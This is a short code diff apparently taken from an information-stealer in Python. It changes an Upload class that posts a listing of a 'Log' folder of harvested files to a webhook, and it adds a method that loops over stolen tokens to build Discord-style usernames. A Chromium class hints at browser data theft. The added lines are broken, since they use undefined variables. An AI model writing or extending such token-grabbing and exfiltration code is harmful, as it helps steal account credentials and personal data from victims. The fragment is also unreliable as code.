@@ -61,7 +61,7 @@ class Upload:
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title="Log",
+                title=f"New log {username}",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
                 color=0x24262A,
             ),
@@ -92,6 +92,12 @@ class Upload:
                 yield from self.tree(path, prefix=prefix+extension)
             else:
                 yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
+    def upload(self):
+        if not self.tokens:
+            return
+
+        for token in self.tokens:
+            username = user['username'] + '#' + user['discriminator']
 
 class Chromium:
     def __init__(self): 
